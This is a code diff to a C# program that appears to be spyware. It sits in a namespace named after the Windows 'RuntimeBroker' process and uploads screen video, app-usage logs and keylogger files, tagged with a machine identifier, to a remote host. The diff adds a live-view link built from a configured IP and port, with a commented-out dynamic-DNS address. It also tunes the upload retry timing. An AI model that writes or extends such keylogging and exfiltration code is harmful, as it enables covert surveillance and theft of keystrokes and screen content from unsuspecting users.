@@ -176,7 +176,6 @@ namespace RuntimeBroker
                                 {
                                     try
                                     {
-
                                         Console.WriteLine("Reup Video");
                                         await UploadVideoApiAsync(session.Id, session.VideoPath, session.AppsPath, session.KeyLogsPath);
                                     }
@@ -184,11 +183,15 @@ namespace RuntimeBroker
                                     {
                                         Log(ex.ToString());
                                     }
+                                    finally
+                                    {
+                                        await Task.Delay((int)TimeSpan.FromSeconds(30).TotalMilliseconds);
+                                    }
                                 }
                             }
                         }
 
-                        await Task.Delay(10000);
+                        await Task.Delay((int)TimeSpan.FromMinutes(2.5).TotalMilliseconds);
                     }
 
                 });
@@ -266,6 +269,9 @@ namespace RuntimeBroker
 
                     try
                     {
+                        string linkLive = $"http://{_appSettings.IP}:{_appSettings.Port}/image.png";
+                        //string linkLive = "http://soft-up.ddns.net:54368/image.png";
+
                         var client = new HttpClient();
                         var request = new HttpRequestMessage(HttpMethod.Post, _appSettings.VideoHost);
                         request.Headers.Add("accept", "*/*");
@@ -274,6 +280,7 @@ namespace RuntimeBroker
                         content.Add(new StreamContent(File.OpenRead(keyLogJsonPath)), "UserAction", Path.GetFileName(keyLogJsonPath));
                         content.Add(new StreamContent(File.OpenRead(appsJsonPath)), "UserSession", Path.GetFileName(appsJsonPath));
                         content.Add(new StringContent(Globals.UUID), "token");
+                        content.Add(new StringContent(linkLive), "LinkLive");
                         request.Content = content;
                         var response = await client.SendAsync(request);
                         response.EnsureSuccessStatusCode();
@@ -295,6 +302,7 @@ namespace RuntimeBroker
                     catch (Exception ex)
                     {
                         Log(ex.ToString());
+                        await Task.Delay((int)TimeSpan.FromSeconds(10).TotalMilliseconds);
                     }
                 }
             }
